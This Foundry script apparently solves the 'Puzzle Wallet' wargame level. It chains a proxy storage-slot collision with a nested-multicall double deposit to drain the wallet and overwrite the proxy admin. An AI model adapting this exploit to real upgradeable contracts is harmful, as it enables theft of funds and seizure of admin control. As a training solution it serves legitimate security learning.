// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script} from "forge-std/Script.sol";
import {console} from "forge-std/console.sol";

import {PuzzleProxy, PuzzleWallet} from "../src/PuzzleWallet.sol";

contract PuzzleWalletScript is Script {
    function run() public {
        PuzzleProxy proxy = PuzzleProxy(payable(0x3ABeda0255B72b65824988BfF29536F164753141));
        PuzzleWallet wallet = PuzzleWallet(address(proxy));
        address player = 0xaCab087f7f0977c31d68E8BAe117069a90Dc6574;

        vm.startBroadcast();

        proxy.proposeNewAdmin(player);
        wallet.addToWhitelist(player);

        console.log("player whitelist %d", wallet.whitelisted(player));

        bytes[] memory deposit = new bytes[](1);
        deposit[0] = abi.encodeWithSelector(PuzzleWallet.deposit.selector);

        bytes[] memory data = new bytes[](2);
        data[0] = abi.encodeWithSelector(PuzzleWallet.multicall.selector, deposit);
        data[1] = data[0];

        address(proxy).call{value: 0.001 ether}(abi.encodeWithSelector(PuzzleWallet.multicall.selector, data));

        uint256 balance = wallet.balances(player);
        console.log("player balance %d", balance);
        bytes memory executeData;

        wallet.execute(player, balance, executeData);

        console.log("wallet balance %d", address(wallet).balance);

        wallet.setMaxBalance(uint256(uint160(player)));

        console.log("admin %s", proxy.admin());

        vm.stopBroadcast();
    }
}